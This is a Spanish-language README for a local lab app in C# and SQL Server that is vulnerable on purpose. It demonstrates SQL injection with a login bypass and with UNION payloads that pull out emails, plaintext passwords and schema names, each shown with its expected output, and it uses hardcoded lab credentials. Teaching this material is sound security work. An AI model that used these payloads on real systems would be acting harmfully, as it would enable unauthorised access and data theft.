# App vulnerable C# + SQL Server

Este proyecto es un laboratorio local para probar consultas SQL vulnerables desde una app de consola en C#.

## Requisitos

- .NET 8
- Docker

## Levantar SQL Server

Desde esta carpeta:

```bash
docker compose up -d
```

Crear la base, tablas, datos y usuario SQL:

```bash
docker exec -u 0 auditoria rm -rf /tmp/setup.sql /tmp/sql
docker cp setup.sql auditoria:/tmp/setup.sql
docker cp sql auditoria:/tmp/sql
docker exec -w /tmp auditoria /opt/mssql-tools18/bin/sqlcmd -S localhost -U sa -P 'Password123!' -C -i setup.sql
```

El script original entregado crea `TiendaDB`, las tablas y los datos. En este ambiente Docker, `setup.sql` ejecuta los archivos de la carpeta `sql/`: creacion de tablas, insercion de datos y configuracion del login SQL `admin` con password `Password123!`, porque el codigo fuente original se conecta con:

```csharp
Server=localhost;Database=TiendaDB;User Id=admin;Password=Password123!;
```

## Ejecutar la app

Crear un archivo `.env` local:

```env
DB_CONN_STRING=Server=localhost;Database=TiendaDB;User Id=admin;Password=Password123!;Encrypt=True;TrustServerCertificate=True;
```

El archivo `.env` esta incluido en `.gitignore` para no subir la cadena de conexion al repositorio.

```bash
dotnet run
```

El connection string usado por `index.cs` se lee desde la variable de entorno:

```text
DB_CONN_STRING
```

## Datos de prueba

Usuarios:

```text
admin / admin123
juan / pass123
```

Clientes:

```text
1 / Juan Donoso / juan@ejemplo.com
2 / Constanza Herrera / conty@ejemplo.com
```

## Inyecciones para probar

Estas pruebas son para este entorno local vulnerable.

### Bypass de login

En la opcion `1. Iniciar Sesion`, ingresar:

```text
Usuario: admin' OR 1=1--
Password: cualquier cosa
```

La consulta queda conceptualmente asi:

```sql
SELECT * FROM Usuarios
WHERE Username = 'admin' OR 1=1--' AND Password = 'cualquier cosa'
```

El `--` comenta el resto de la consulta.

### Obtener un cliente ignorando el ID

En la opcion `2. Buscar Cliente (ID)`, ingresar:

```text
1 OR 1=1
```

La consulta queda:

```sql
SELECT Nombre FROM Clientes WHERE Id = 1 OR 1=1
```

Como el codigo usa `ExecuteScalar()`, solo muestra el primer resultado.

### Obtener todos los clientes

Ingresar como ID:

```text
0 UNION SELECT STRING_AGG(Nombre, ', ') FROM Clientes--
```

Resultado esperado:

```text
Juan Donoso, Constanza Herrera
```

### Obtener clientes con email

Ingresar como ID:

```text
0 UNION SELECT STRING_AGG(Nombre + ' - ' + Email, ', ') FROM Clientes--
```

Resultado esperado:

```text
Juan Donoso - juan@ejemplo.com, Constanza Herrera - conty@ejemplo.com
```

### Obtener usuarios y passwords

Ingresar como ID:

```text
0 UNION SELECT STRING_AGG(Username + ' - ' + Password, ', ') FROM Usuarios--
```

Resultado esperado:

```text
admin - admin123, juan - pass123
```

### Listar tablas de la base

Ingresar como ID:

```text
0 UNION SELECT STRING_AGG(TABLE_NAME, ', ') FROM INFORMATION_SCHEMA.TABLES--
```

Resultado esperado:

```text
Usuarios, Clientes
```

### Listar columnas de Usuarios

Ingresar como ID:

```text
0 UNION SELECT STRING_AGG(COLUMN_NAME, ', ') FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'Usuarios'--
```

Resultado esperado:

```text
Id, Username, Password
```

### Listar columnas de Clientes

Ingresar como ID:

```text
0 UNION SELECT STRING_AGG(COLUMN_NAME, ', ') FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'Clientes'--
```

Resultado esperado:

```text
Id, Nombre, Email
```

## Que se filtra con errores

Si una inyeccion queda mal escrita, la app puede mostrar un stack trace como:

```text
System.Data.SqlClient.SqlException
Incorrect syntax near ...
AppVulnerable.Program.Login()
index.cs:line ...
```

Eso puede filtrar:

- Tecnologia usada: C#/.NET y SQL Server.
- Archivo y linea donde ocurre el error.
- Namespace, clase y metodo.
- Ruta local del proyecto.
- Pistas sobre la consulta SQL.

## Nota de seguridad

Este codigo esta hecho para demostrar SQL Injection. En una aplicacion real se deben usar consultas parametrizadas, no concatenar datos ingresados por el usuario dentro del SQL.
